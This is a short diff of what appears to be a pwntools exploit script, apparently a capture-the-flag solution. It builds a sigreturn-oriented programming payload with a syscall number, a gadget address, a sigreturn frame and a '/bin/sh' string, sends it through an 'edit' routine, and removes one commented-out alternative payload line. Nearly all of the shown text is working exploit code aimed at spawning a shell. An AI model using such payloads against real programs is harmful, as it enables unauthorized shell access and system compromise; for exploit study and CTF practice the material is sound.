@@ -50,7 +50,6 @@ sigret_frame.rdx = 0
 payload = p64(15) + p64(0x40127F) + bytes(sigret_frame) + b"/bin/sh\x00"
 
 edit(32, payload)
-#edit(32, flat([15, 0x40127F, sigret_frame, b"/bin/sh\x00"]))
 for i in range(29):
     p.recvuntil(b"Input your name : ")
     p.sendline(b"wayell")
